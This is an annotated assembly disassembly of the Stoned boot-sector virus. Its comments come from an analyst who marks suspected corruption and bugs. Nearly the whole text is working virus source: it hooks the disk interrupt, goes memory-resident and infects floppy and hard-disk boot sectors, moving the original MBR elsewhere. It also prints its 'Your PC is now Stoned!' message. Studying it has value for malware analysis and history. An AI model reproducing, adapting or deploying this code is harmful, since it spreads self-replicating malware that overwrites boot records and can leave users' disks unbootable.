; Disassembly of `Virus.Boot.Stoned.a`.
;
; Source: EXE file (MD5: 653aae301bbdfb4b3dd48d27d2e3bb4b); the EXE metadata and irrelevant
; content has been ignored.

org 7c00h

k_is_loading_from_floppy: equ 0
k_is_loading_from_disk: equ 2

k_sector_original_boot_sector_floppy:    equ 3
k_head_original_boot_sector_floppy: equ 1
k_drive_original_boot_sector_floppy: equ 0
k_sector_original_boot_sector_hard_disk: equ 7
k_head_drive_original_boot_sector_hard_disk: equ 0x80

boot_segment: equ 0x7c0

boot_entry:
      jmp word boot_segment:$+5-boot_entry
      jmp word entry_point

v_loading_location:      db k_is_loading_from_floppy
v_original_int_13h:      dd 0
v_virus_main_routine:    dw main_routine-boot_entry
v_unknown_1:             dw 0
v_boot_entry:            dw boot_entry, 0

virus_int_13h:

      push ds
      push ax
      cmp ah,0x2             ; read
      jb return_to_int_13h   ; less? exit

      cmp ah,0x4
      jnb return_to_int_13h  ; above or equal? exit

; its_a_read_or_write:

      or dl,dl               ; floppy?
      jnz return_to_int_13h

      xor ax,ax
      mov ds,ax
      mov al,[0x43f]         ; bios: drive running
      test al,0x1            ; floppy drive motors active?
      jnz return_to_int_13h
      call word prepare_floppy_infection

return_to_int_13h:

      pop ax
      pop ds
      jmp word far [cs:v_original_int_13h-boot_entry]

prepare_floppy_infection:

      push bx
      push cx
      push dx
      push es
      push si
      push di
      mov si,0x4    ; number of attempts on error

read_floppy_boot_sector:

      mov ax,0x201
      push cs
      pop es
      mov bx,r_boot_sector_buffer-boot_entry
      xor cx,cx
      mov dx,cx
      inc cx
      pushfw
      call word far [cs:v_original_int_13h-boot_entry]
      jnc check_if_floppy_is_infected

error_on_read_operation:

      xor ax,ax ; reset disk
      pushfw
      call word far [cs:v_original_int_13h-boot_entry]
      dec si ; number of attempts; see :prepare_floppy_infection
      jnz read_floppy_boot_sector
      jmp exit_from_int_13h
      nop

check_if_floppy_is_infected:

      xor si,si
      mov di,r_boot_sector_buffer-boot_entry
      cld
      push cs
      pop ds
      lodsw
      cmp ax,[di]
      jnz store_original_floppy_boot_sector
      lodsw
      cmp ax,[di+0x2]
      jz exit_from_int_13h

store_original_floppy_boot_sector:

      mov ax,0x301
      mov bx,r_boot_sector_buffer-boot_entry
      mov cl,k_sector_original_boot_sector_floppy
      mov dh,k_head_original_boot_sector_floppy
      pushfw
      call word far [cs:v_original_int_13h-boot_entry]
      jc exit_from_int_13h

write_virus_on_floppy_boot_sector:

      mov ax,0x301
      xor bx,bx
      mov cl,0x1
      xor dx,dx
      pushfw
      call word far [cs:v_original_int_13h-boot_entry]

exit_from_int_13h:

      pop di
      pop si
      pop es
      pop dx
      pop cx
      pop bx
      ret

entry_point:

      xor ax,ax       ; prepare the ds, ss:sp
      mov ds,ax
      cli
      mov ss,ax
      mov sp,boot_entry
      sti

      mov ax,[13h*4]                       ; store original int 13h address
      mov [v_original_int_13h],ax
      mov ax,[13h*4+2]
      mov [v_original_int_13h+2],ax

decrease_available_memory:

      mov ax,[0x413]                       ; bios: (available) memory size.
      dec ax                               ; decrease it by 2k.
      dec ax
      mov [0x413],ax


      mov cl,0x6                            ; set ES to the virus segment (hole address; convert
      shl ax,cl                             ; from KiB to segments).
      mov es,ax
      mov [0x7c0f],ax

      mov ax,0x15                           ; hijack int 13h
      mov [0x13*4],ax
      mov [0x13*4+2],es

      mov cx,memory_buffer-boot_entry       ; clone into resident location
      push cs
      pop ds
      xor si,si
      mov di,si
      cld
      rep movsb

jump_to_main_routine:

      jmp word far [cs:v_virus_main_routine-boot_entry] ; points to main_routine (in the resident location)

main_routine:

; reset_drive:

      mov ax,0x0            ; reset hard disk - DL (drive) is not specified (!)
      int 0x13

; copy_original_boot_sector:

      xor ax,ax
      mov es,ax
      mov ax,0x201          ; read, one sector
      mov bx,boot_entry     ; overwrite in-memory boot sector
      cmp byte [cs:v_loading_location-boot_entry],k_is_loading_from_floppy
      jz copy_from_floppy

; copy_from_hard_disk:

      mov cx,2              ; corruption? this is supposed to be 7 (k_sector_original_boot_sector_hard_disk) (!)
      mov dx,k_head_drive_original_boot_sector_hard_disk
      int 0x13
      jmp resume_original_boot

      nop

copy_from_floppy:

      mov cx,k_sector_original_boot_sector_floppy
      mov dx,k_head_original_boot_sector_floppy*0x100+k_drive_original_boot_sector_floppy
      int 0x13
      jc resume_original_boot

      test byte [es:0x46c],0x7           ; bios: clock; DWORD Timer ticks since midnight
      jnz copy_hard_disk_mbr

print_message:

      mov si,payload_message-boot_entry
      push cs
      pop ds

print_message_cycle:
      lodsb
      or al,al
      jz copy_hard_disk_mbr

      mov ah,0xe            ; teletype output
      mov bh,0x0            ; page number
      int 0x10
      jmp print_message_cycle

copy_hard_disk_mbr:

      push cs
      pop es
      mov ax,0x201                       ; read, one sector
      mov bx,r_boot_sector_buffer-boot_entry
      mov cl,0x1                         ; sector 1
      mov dx,0x80                        ; head 0, hard disk
      int 0x13
      jc resume_original_boot

check_if_hard_disk_is_infected:

      push cs
      pop ds
      mov si,r_boot_sector_buffer-boot_entry
      mov di,0x0
      lodsw
      cmp ax,[di]
      jnz infect_hard_disk
      lodsw
      cmp ax,[di+0x2]
      jnz infect_hard_disk

resume_original_boot:

      ; prepares this flag in advance, for when floppies are infected (!).
      ;
      mov byte [cs:v_loading_location-boot_entry],k_is_loading_from_floppy

      jmp word far [cs:v_boot_entry-boot_entry]

infect_hard_disk:

    mov byte [cs:v_loading_location-boot_entry],k_is_loading_from_disk

backup_mbr:

    mov ax,0x301                                      ; write, one sector
    mov bx,r_boot_sector_buffer-boot_entry
    mov cx,k_sector_original_boot_sector_hard_disk
    mov dx,k_head_drive_original_boot_sector_hard_disk
    int 0x13
    jc resume_original_boot

    push cs
    pop ds
    push cs
    pop es
    mov si,(r_boot_sector_buffer-boot_entry)+(partition_table-boot_entry)
    mov di,partition_table-boot_entry                 ; copy the partition table, plus other 512 bytes,
    mov cx,0x400-(partition_table-boot_entry)         ; assuming that a disk sector is 1K.
    rep movsb

    mov ax,0x301     ; write, one sector
    xor bx,bx        ; boot_entry
    inc cl           ; sector 1
    int 0x13
    jmp resume_original_boot

payload_message: db 7h, 'Your PC is now Ston', 90h, 'd!', 07h, 0Dh, 0Ah, 0Ah, 0
hidden_message:  db 'LEGALISE MARIJUANA!'

memory_buffer:

padding:              times 6 db 0
partition_table:      times 64 db 0
boot_signature:       times 2 db 0    ; not referenced; here for completeness

r_boot_sector_buffer: times 512 db 0

virus_end: